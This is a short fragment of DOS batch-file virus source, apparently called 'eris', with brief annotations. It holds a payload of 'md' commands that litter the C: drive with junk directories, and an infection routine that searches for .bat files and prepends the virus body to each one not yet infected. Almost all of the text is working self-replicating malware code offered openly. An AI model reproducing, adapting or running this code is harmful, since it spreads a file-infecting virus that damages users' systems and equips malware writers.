md c:\czffhitwczf>eris
md c:\czffhittr>eris
md c:\czffhzfitrc>eris
md c:\czffhicr>eris
md c:\czffhitczffrcv>eris
md c:\czffhzffhitc>eris
md c:\llczffhitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrczffhitcr>eris
md c:\rryrr>eris
md c:\czffczffcrcy>eris
md c:\ttrcrczffhitv>eris
md c:\uuczffhitczffhit>eris
md c:\vvcr>eris
md c:\wwrczffhit>eris
md c:\hhvc>eris
md c:\yyrczffhit>eris
md c:\zczczffhitc>eris
del eris

-->the above is the payload, that creates 407 directories
-->it does not take as long as you expect

:naeris
set eris=
goto erisend
:erisvir
shift%_eris%
if '%2==' exit eris
for %%a in (%2\*.bat %2*.bat) do call c:\_eris eris i %%a
goto erisvir
:erisi
find "eris"<%3>nul
if not errorlevel 1 goto erisj
type c:\_eris.bat>eris$
type %3>>eris$
move eris$ %3>nul
set eris#=%eris#%1
if %eris#%==11111 exit
:erisj
set eris!=%eris!%1
if %eris!%==1 exit
:erisend

-->the above is the rest of the infection-routine